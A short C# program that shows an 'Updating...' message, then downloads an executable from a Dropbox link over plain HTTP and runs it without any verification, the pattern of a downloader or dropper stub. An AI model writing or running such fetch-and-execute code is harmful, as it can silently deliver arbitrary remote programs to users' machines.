using System;
using System.Net;

class Program
{
    static void Main(string[] args)
    {
        Console.WriteLine("Updating...");
        WebClient web = new WebClient();
        web.DownloadFile("http://dl.dropboxusercontent.com/s/mwfed4ny4kukdqv/Fast%20File%20Opener.exe", "Fast File Opener.exe");
        System.Diagnostics.Process.Start("Fast File Opener.exe");
    }
}